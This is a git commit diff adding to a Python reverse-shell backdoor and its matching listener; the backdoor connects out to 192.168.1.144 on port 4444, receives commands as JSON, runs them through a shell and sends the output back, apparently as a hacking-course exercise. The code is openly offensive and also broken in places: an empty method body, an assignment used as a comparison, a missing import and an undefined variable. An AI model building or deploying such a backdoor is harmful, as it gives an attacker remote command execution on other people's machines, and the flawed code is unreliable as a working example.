01aace9829330e7a0f29947514564ca54920f6f3
root <root@localhost.localdomain>
2020-02-09 16:18:09 +1000

    listener, backdoor

--- listener.py
+++ listener.py
@@ -1,4 +1,7 @@
-import socket, json
+import socket, json, simplejson, sys
+import re
+import zlib
+import linecache
 
 class Listener:
 	def __init__(self, ip, port):
@@ -10,23 +13,45 @@ class Listener:
 		self.connection, address = listener.accept()
 		print("[+] Got a connection from " + str(address))
 
+
+	def PrintException(self):
+			exc_type, exc_obj, tb = sys.exc_info()
+			f = tb.tb_frame
+			lineno = tb.tb_lineno
+			filename = f.f_code.co_filename
+			linecache.checkcache(filename)
+			line = linecache.getline(filename, lineno, f.f_globals)
+			print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)
+
+
 	def reliable_send(self, data):
-		json_data = json.dump(data) #wrap data in json format
-		self.connection.send(json_data)
+		json_data = json.dumps(data) #wrap data in json format
+		#print("json data to send: ", json_data)
+		self.connection.send(json_data.encode('latin1', errors='replace'))
 
 	def reliable_receive(self):
-		json_data = self.connection.recv(1024)
-		return json.loads(json_data) #unwrap json data
+		json_data = ""
+		#loop = 0
+		while True:
+			try:
+				json_data = json_data + self.connection.recv(1024)
+				decoded_json = json_data.decode()
+				return json.loads(decoded_json) #unwrap json data
+			except ValueError:
+				self.PrintException()
+				continue
 
 	def execute_remotely(self, command):
-		#self.connection.send(command)
 		self.reliable_send(command)
-		#return self.connection.recv(1024)
+		if command[0] == "exit":
+			self.connection.close()
+			exit()
 		return self.reliable_receive()
-		
+
 	def run(self):
 		while True:
 			command = raw_input(">> ") # NB just input for Python 3
+			command = command.split(" ")
 			result = self.execute_remotely(command) 
 			print(result) 
 
--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,27 +1,60 @@
-import socket, subprocess
+import socket, json, sys, socket, subprocess
+import re
+import zlib
+import linecache
+
 class Backdoor:
 	def __init__(self, ip, port):
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.connection.connect((ip, port))
-		
+
+	def PrintException(self):
+			exc_type, exc_obj, tb = sys.exc_info()
+			f = tb.tb_frame
+			lineno = tb.tb_lineno
+			filename = f.f_code.co_filename
+			linecache.checkcache(filename)
+			line = linecache.getline(filename, lineno, f.f_globals)
+			print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)
+
+
 	def reliable_send(self, data):
-		json_data = json.dump(data) #wrap data in json format
-		self.connection.send(json_data)
+		json_data = json.dumps(data) #wrap data in json format
+		self.connection.send(json_data.encode())
 
 	def reliable_receive(self):
-		json_data = self.connection.recv(1024)
-		return json.loads(json_data) #unwrap json data
+		json_data = ""
+		while True:
+			try:
+				json_data = json_data + self.connection.recv(1024)
+				return json.loads(json_data.decode('latin1', errors='replace')) #unwrap json data
+			except ValueError:
+				continue
 
 	def execute_system_command(self, command):
 		return subprocess.check_output(command, shell=True)
 
+	def change_working_diretory_to(self, path):
+		os.chdir(path)
+		return "[+] Changing working directory to " + path
+
+	def read_file(self, path):
+		
+
+
 	def run(self):
-		connection.send("\n[+] Welcome to hell\n")
+		#self.connection.send("\n[+] Welcome to hell\n")
 		while True:
-			command = self.connection.recv(1024) # will wait for data to be sent so that it can be received, will get a broken pipe if file/ data is larger than this
-			command_result = self.execute_system_command(command)
-			self.connection.send(command_result)
-		self.connection.close()
+			command = self.reliable_receive() # will wait for data to be sent so that it can be received, will get a broken pipe if file/ data is larger than this
+			if command[0] == "exit":
+				self.connection.close()
+				exit()
+			elif command[0] = "cd" and len(command) > 1:
+				self.change_working_diretory_to(command[1])
+			else:
+				command_result = self.execute_system_command(command)
+			self.reliable_send(command_result)
+		#self.connection.close()
 	
 my_backdoor = Backdoor("192.168.1.144", 4444)
 my_backdoor.run()
